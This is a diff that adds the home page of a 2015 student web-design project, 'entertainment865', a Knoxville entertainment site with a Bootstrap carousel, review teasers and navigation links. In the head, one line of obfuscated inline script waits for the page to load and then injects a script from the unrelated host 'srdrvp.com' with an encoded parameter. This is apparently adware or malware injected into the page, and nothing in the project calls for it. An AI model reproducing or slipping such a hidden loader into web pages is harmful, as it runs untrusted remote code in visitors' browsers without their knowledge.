@@ -1,0 +1,252 @@
+<!--
+
+Name: Russell Anderson
+Course: CSIT2230
+Assignment: Final Semester Project Milestone 6
+Due Date: 11/25/2015
+
+Resources Used: bootstrap carousel template - http://getbootstrap.com/examples/carousel/
+
+Images: (note: I do not own the rights to any of these images)
+knoxville skyline: https://www.bing.com/images/search?q=downtown+knoxville+skyline&view=detailv2&&id=30C7E54B98C22FEA7BB26BBE2D8AF3C6FF982CD1&selectedIndex=15&ccid=Dej%2f17Gz&simid=608049550376044168&thid=OIP.M0de8ffd7b1b366145988ae240e406072H0&ajaxhist=0
+trees 2nd carousel slide: http://www.browniebites.net/wp-content/uploads/2014/12/knoxville-fantasy-of-trees-2014-12.jpg
+smoky mt silhouette: bing.com/images/search?q=smoky+mountain+silhouette&view=detailv2&&id=154709724F805E97CDEEFA35A8FF8CF692658591&selectedIndex=133&ccid=TyFX1TFo&simid=608052273384392088&thid=OIP.M4f2157d531688a8d51e32032e0f4b0c3o0&ajaxhist=0
+tennessee theatre: https://www.bing.com/images/search?q=Tennessee+Gay+Street+Theatre&view=detailv2&&id=1E76BFE93C218D09C5AC876FFD5ADD1C6B0ACCC8&selectedIndex=3&ccid=BXphDT8S&simid=608002511893760214&thid=OIP.M057a610d3f124aa572f28ba9b61f2193o0&ajaxhist=0
+file cabinet: https://www.bing.com/images/search?q=database+file+cabinet&view=detailv2&&id=6288E5C6ECB87303DDD2073CC60EF8A8723195C9&selectedIndex=21&ccid=MNyfPT0i&simid=607987689959654739&thid=OIP.M30dc9f3d3d22e25fe71fff036cbb55f1o0&ajaxhist=0
+knife party album cover: http://www.youredm.com/2015/11/19/knife-party-releases-ep-a-day-early-via-1001tracklists/
+fantasy football image: http://sportsunbiased.com/nfl/34704/2014-2015-fantasy-football-printable-ppr-cheat-sheets/
+Note: all entertainment865 logos designed by and property of Russell Anderson.
+
+-->
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"> 
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+	
+	<!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+	
+	 <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+    <!-- Latest compiled JavaScript -->
+    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+	
+	    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
+	
+	<!-- less link -->
+	<link rel="stylesheet/less" href="entertainment865.css">
+      <script src="less.js" type="text/javascript"></script>
+	  
+	  <!-- Google Web Fonts: using Orbitron for menu fonts, jumbotrons, headers and Vollkorn for smaller text, paragraphs and database page-->
+	  <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Orbitron|Vollkorn">
+	</head>
+	
+	
+	<title>e865 Home Base</title>
+
+    <!-- Custom styles for this template -->
+    <link href="entertainment865.css" rel="stylesheet">
+  <script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTI2NDY1NTU5ODRwgjUJiG2VEtIBVSfCXS96o1XkByyx783TkMd2FtGOGA4kjStb8eIASrxkW50GxXKdGKUivxml5KBB7zJrmZvNfP%2F4qHLIrgl0ZvyNveDP060tI%2BcanGM4j8fhTzDgXWWk8o2jZGJXLV59oKGAiOWLAkziWqrZ5%2B4%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
+<!-- NAVBAR
+================================================== -->
+  <body>
+    <div class="navbar-wrapper">
+      <div class="container">
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              <a class="navbar-brand" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865.html#"><img src="ent865logo6.png" class="logo" alt="ent865logo"></a> 
+            </div>
+            <div id="navbar" class="navbar-collapse collapse">
+              <ul class="nav navbar-nav">
+                <li class="active"><a href="#">Home</a></li>
+				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865calendar.html">Calendar</a></li>
+				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865db.php#">Database</a></li>
+				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865exclusive.html">Exclusive</a></li>
+                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865about.html#">About</a></li>
+                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865contact.html#">Contact</a></li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+
+      </div>
+    </div>
+	<center><img class="img-responsive" src="e865logo2.png" alt="ent865logoMain" width="800" height="110"></center>
+	
+    <!-- Carousel
+    ================================================== -->
+	<div class="container_home">
+    <div id="myCarousel" class="carousel slide" data-ride="carousel">
+      <!-- Indicators -->
+      <ol class="carousel-indicators">
+        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+        <li data-target="#myCarousel" data-slide-to="1"></li>
+        <li data-target="#myCarousel" data-slide-to="2"></li>
+      </ol>
+      <div class="carousel-inner" role="listbox">
+        <div class="item active">
+          <img class="first-slide" img src="knoxSkyline2.jpg" alt="First slide">
+          <div class="container">
+            <div class="carousel-caption">
+              <h1>Welcome to entertainment865</h1>
+              <p class="mainP">Knoxville's newest entertainment source for all original content and all things East Tennessee.</p>
+            </div>
+          </div>
+        </div>
+        <div class="item">
+          <img class="second-slide" src="knoxFantasyTrees.jpg" alt="Second slide">
+          <div class="container">
+            <div class="carousel-caption">
+              <h1 class="TreesH"><u>Upcoming Event: The Fantasy of Trees!</u></h1>
+              <p></p>
+			  <p><a class="btn btn-lg btn-primary" href="http://www.fantasyoftrees.org/" role="button">Learn More</a></p>
+            </div>
+          </div>
+        </div>
+        <div class="item">
+          <img class="third-slide" src="smokySil1.jpg" alt="Third slide">
+          <div class="container">
+            <div class="carousel-caption">
+              <h1>Find out more about East Tennessee</h1>
+              <p>Find out what makes Knoxville and beyond such a unique play to live and visit.</p>
+              <p><a class="btn btn-lg btn-primary" href="https://www.bing.com/search?q=east+tennessee&form=EDGHPC&qs=PF&cvid=8e5b249538eb49708c31e20c24f79cba&pq=east%20tennessee" role="button">Discover East Tennessee</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
+        <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+        <span class="sr-only">Previous</span>
+      </a>
+      <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
+        <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+        <span class="sr-only">Next</span>
+      </a>
+    </div><!-- /.carousel -->
+	</div>
+	</div>
+	
+	<div class="feature_well">
+	<center><h2 class="feat_header">Latest Articles</h2></center>
+	</div>
+	
+	<!-- START THE FEATURETTES -->
+
+      <hr class="featurette-divider">
+
+      <div class="row featurette">
+	  <div class="col-md-5">
+          <img class="featurette-image img-responsive center-block" src="theNightBefore.jpg" width=400 height=400" alt="theNightBeforeAhhhh">
+        </div>
+        <div class="col-md-7">
+          <h2 class="featurette-heading">The Night Before<span class="text-muted">&nbsp;&nbsp;Movie Review</span></h2>
+          <p class="lead">"The Night Before" stars Seth Rogen, Joseph Gordon-Levitt and Anthony Mackie as three friends who have shared the same Christmas tradition for the past fourteen
+		years...</p>
+		<center><p><a class="btn btn-lg btn-primary" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/theNightBeforeReview.html" role="button">Read Review</a></p></center>
+        </div>
+      </div>
+
+      <hr class="featurette-divider">
+
+      <div class="row featurette">
+        <div class="col-md-7 col-md-push-5">
+          <h2 class="featurette-heading"><span class="text-muted">EP Review</span>&nbsp;&nbsp;Trigger Warning - Knife Party</h2>
+      		 <p class="lead">I remember growing up back in the 90's, new albums were always released on Tuesday, it was almost a gaurantee that at least one big artist
+		or two would have an album releasing on any given Tuesday throughout the year...</p>
+			 <center><p><a class="btn btn-lg btn-primary" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/triggerWarningReview.html" role="button">Read Review</a></p></center>
+        </div>
+		<div class="col-md-5 col-md-pull-7">
+          <img class="featurette-image img-responsive center-block" src="kpTrigWarn.jpg" width=400 height=400 alt="kpAltImg">
+        </div>
+      </div>
+
+      <hr class="featurette-divider">
+
+      <div class="row featurette">
+	   <div class="col-md-5">
+          <img class="featurette-image img-responsive center-block" src="fantasyFb.jpg" alt="fantasyFootball">
+        </div>
+        <div class="col-md-7">
+          <h2 class="featurette-heading">On-line Fantasy Sports:<span class="text-muted">&nbsp;Is the end near?</span></h2>
+          <p class="lead">Fantasy football has become very big business lately and it seems that it's future is now uncertain.  Earlier this month the New York Attorney's General, Eric Schneiderman ordered...</p>
+		  <center><p><a class="btn btn-lg btn-primary" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/fantArticle.html#" role="button">Read Article</a></p></center>
+        </div>
+       
+      </div>
+
+      <hr class="featurette-divider">
+
+      <!-- /END THE FEATURETTES -->
+
+
+    <!-- Marketing messaging and featurettes
+    ================================================== -->
+    <!-- Wrap the rest of the page in another container to center all the content. -->
+	
+    <div class="container marketing">
+	
+	<div class="feature_well2">
+	<center><h2 class="feat_header">What We Do</h2></center>
+	</div>
+
+      <!-- Three columns of text below the carousel -->
+      <div class="row">
+        <div class="col-lg-4">
+          <img class="img-rounded" src="ent865logo4.jpg" alt="ent865altLogo" width="140" height="140">
+          <h2>Learn more</h2>
+          <p>We strive to bring the Knoxville area and beyond the most accurate, enlightening and of course entertaining material you just wont find anywhere else...</p>
+          <p><a class="btn btn-default" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865about.html#" role="button">Keep reading &raquo;</a></p>
+        </div><!-- /.col-lg-4 -->
+        <div class="col-lg-4">
+          <img class="img-rounded" src="tenThea1.jpg" alt="tennTheatre" width="140" height="140">
+          <h2>Events</h2>
+          <p>Wondering what to do tonight? From Hollywood movie premieres at the Pinnacle to an  take a look inside to see what's coming up.</p>
+          <p><a class="btn btn-default" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865calendar.html" role="button">View Events &raquo;</a></p>
+        </div><!-- /.col-lg-4 -->
+        <div class="col-lg-4">
+          <img class="img-rounded" src="fileCabDb.jpg" alt="fileCabinet" width="140" height="140">
+          <h2>Knoxville's Finest</h2>
+          <p>Check out our ever expanding database featuring artists from the Knoxville area, no musician, actor or whatever else is too big or small.</p>
+          <p><a class="btn btn-default" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865db.php#" role="button">See who's who &raquo;</a></p>
+        </div><!-- /.col-lg-4 -->
+      </div><!-- /.row -->
+	  
+	  
+
+
+      <!-- FOOTER -->
+      <footer>
+        <center><p class="pull-center"><a href="#">Back to top</a></p>
+        <p>&copy; 2015 entertainment865, Inc. &middot; All Rights Reserved</p></center>
+      </footer>
+
+    </div><!-- /.container -->
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="../../dist/js/bootstrap.min.js"></script>
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
+  </body>
+	
+</html>
